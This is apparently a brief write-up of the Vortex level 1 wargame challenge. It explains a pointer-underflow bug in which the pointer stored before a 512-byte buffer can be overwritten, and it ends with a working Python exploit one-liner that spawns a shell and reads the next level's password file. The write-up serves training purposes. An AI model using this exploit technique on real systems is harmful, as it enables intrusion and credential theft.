There is one pointer, called ptr, and one buffer with 512 chars, called buf.

Ptr is set to point to the middle of buf initially.

The executable allows to do 3 things : 

- push \n : print the buffer
- push \  : decrement ptr, pushing it nearer to the beginning of buf
- default : setting the value pointed by ptr to a given value and incrementing pointer, pushing it nearer to the end of buf, it is not already at the end

The main idea is that the value of ptr is stored just before the beginning of buf.

So if we decrement ptr to point just before the beginning of buf by pushing '\', ptr points at itself, and we can change its value arbitrarily using the third option listed before.
 
This works, but I do not know why I need to put all the chars after the ptr value change
```
python -c 'print "\\"*0x105+"\xcaXXXXXXXX" + "\\" + "z"*4000 + "\nwhoami\n" + "cat /etc/vortex_pass/vortex2\n"' | ./vortex1 
```
